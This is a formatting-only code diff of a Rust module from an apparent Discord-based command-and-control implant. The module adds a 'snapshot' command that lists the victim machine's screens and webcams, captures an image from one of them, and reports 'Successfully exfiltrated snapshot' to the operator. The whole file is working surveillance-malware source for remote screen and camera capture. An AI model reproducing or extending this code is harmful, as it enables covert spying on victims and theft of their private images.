@@ -10,11 +10,7 @@ use serenity::{
 		application::{
 			command::CommandOptionType,
 			interaction::{
-				application_command::{
-					ApplicationCommandInteraction,
-					CommandDataOption,
-					CommandDataOptionValue,
-				},
+				application_command::{ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue},
 				InteractionResponseType,
 			},
 		},
@@ -29,9 +25,7 @@ use crate::{errors::DiscordC2Error, libraries::nokhwa_wrapper::wrapper};
 /// ### Returns
 /// A mutable reference to a CreateApplicationCommandOption
 #[cfg(target_os = "windows")]
-fn create_screen_option(
-	sub_command: &mut CreateApplicationCommandOption,
-) -> &mut CreateApplicationCommandOption {
+fn create_screen_option(sub_command: &mut CreateApplicationCommandOption) -> &mut CreateApplicationCommandOption {
 	let screens = Screen::all().unwrap(); // TODO: check for errors
 	let mut screen_option = sub_command
 		.name("screen")
@@ -45,8 +39,7 @@ fn create_screen_option(
 			.required(true);
 
 		for i in 0..screens.len() {
-			screen_list_option =
-				screen_list_option.add_int_choice(format!("Screen {}", i), i as i32);
+			screen_list_option = screen_list_option.add_int_choice(format!("Screen {}", i), i as i32);
 		}
 		screen_list_option
 	});
@@ -56,10 +49,7 @@ fn create_screen_option(
 /// Creates a camera sub-option, given a mutable reference to a CreateApplicationCommandOption, and a Vec of CameraInfo
 /// ### Returns
 /// A mutable reference to a CreateApplicationCommandOption
-fn create_camera_option(
-	sub_command: &mut CreateApplicationCommandOption,
-	cameras: Vec<CameraInfo>,
-) -> &mut CreateApplicationCommandOption {
+fn create_camera_option(sub_command: &mut CreateApplicationCommandOption, cameras: Vec<CameraInfo>) -> &mut CreateApplicationCommandOption {
 	let mut camera_option = sub_command
 		.name("camera")
 		.description("Take a snapshot from a camera")
@@ -74,10 +64,7 @@ fn create_camera_option(
 
 		// Add integer choices to the camera list option based on the number of cameras.
 		for (i, camera) in cameras.iter().enumerate() {
-			camera_list_option = camera_list_option.add_int_choice(
-				format!("{} ({})", camera.human_name(), camera.description()),
-				i as i32,
-			);
+			camera_list_option = camera_list_option.add_int_choice(format!("{} ({})", camera.human_name(), camera.description()), i as i32);
 		}
 
 		camera_list_option
@@ -88,9 +75,7 @@ fn create_camera_option(
 
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
 	// Create the snapshot command.
-	let snapshot_command = command
-		.name("snapshot")
-		.description("Grabs a snapshot from the screen or the camera");
+	let snapshot_command = command.name("snapshot").description("Grabs a snapshot from the screen or the camera");
 
 	// This is just a depression mess not worth commenting out.
 	snapshot_command.create_option(|option| {
@@ -175,16 +160,15 @@ pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>
 		.ok_or_else(|| DiscordC2Error::InvalidInput("Expected snapshot type.".to_string()))?
 		.options
 		.get(0)
-		.ok_or_else(|| {
-			DiscordC2Error::InvalidInput("Snapshot type option not found.".to_string())
-		})?;
+		.ok_or_else(|| DiscordC2Error::InvalidInput("Snapshot type option not found.".to_string()))?;
 
 	match option.name.as_str() {
 		"screen" => {
 			// Grabs the screen option from the first options key.
-			let screen_option = option.options.get(0).ok_or_else(|| {
-				DiscordC2Error::InvalidInput("Expected screen_list option.".to_string())
-			})?;
+			let screen_option = option
+				.options
+				.get(0)
+				.ok_or_else(|| DiscordC2Error::InvalidInput("Expected screen_list option.".to_string()))?;
 
 			// Now that we have the screen option, grab the index from .resolved, or throw an error.
 			let screen_index = screen_option
@@ -194,39 +178,32 @@ pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>
 					CommandDataOptionValue::Integer(integer) => Some(integer),
 					_ => None,
 				})
-				.ok_or_else(|| {
-					DiscordC2Error::InvalidInput("Invalid screen_list value.".to_string())
-				})?;
+				.ok_or_else(|| DiscordC2Error::InvalidInput("Invalid screen_list value.".to_string()))?;
 
 			Ok(Some(process_screen_option(screen_index as i32)?))
 		},
 		"camera" => {
 			// Grabs the camera option from the first options key.
-			let camera_option = option.options.get(0).ok_or_else(|| {
-				DiscordC2Error::InvalidInput("Expected camera_list option.".to_string())
-			})?;
+			let camera_option = option
+				.options
+				.get(0)
+				.ok_or_else(|| DiscordC2Error::InvalidInput("Expected camera_list option.".to_string()))?;
 
 			// Now that we have the camera option, grab the index from .resolved, or throw an error.
 			let camera_index = camera_option
 				.resolved
 				.clone()
 				.and_then(|value| match value {
-					CommandDataOptionValue::Integer(integer) => {
-						Some(CameraIndex::Index(integer as u32))
-					},
+					CommandDataOptionValue::Integer(integer) => Some(CameraIndex::Index(integer as u32)),
 					_ => None,
 				})
-				.ok_or_else(|| {
-					DiscordC2Error::InvalidInput("Invalid camera_list value.".to_string())
-				})?;
+				.ok_or_else(|| DiscordC2Error::InvalidInput("Invalid camera_list value.".to_string()))?;
 
 			Ok(Some(process_camera_option(camera_index)?))
 		},
 		_ => {
 			println!("Invalid snapshot type: {}", option.name);
-			Err(DiscordC2Error::InvalidInput(
-				"Invalid snapshot type.".to_string(),
-			))
+			Err(DiscordC2Error::InvalidInput("Invalid snapshot type.".to_string()))
 		},
 	}
 }
@@ -262,17 +239,11 @@ pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>
 ///     }
 /// }
 /// ```
-pub async fn snapshot_handler(
-	ctx: &Context,
-	command: &ApplicationCommandInteraction,
-) -> Result<(), DiscordC2Error> {
+pub async fn snapshot_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
 	let content = run(&command.data.options).await?;
 
 	let (message_content, message_file) = match content {
-		Some(content) => (
-			"Successfully exfiltrated snapshot:".to_owned(),
-			Some(content),
-		),
+		Some(content) => ("Successfully exfiltrated snapshot:".to_owned(), Some(content)),
 		None => ("There was no file available".to_owned(), None),
 	};
 
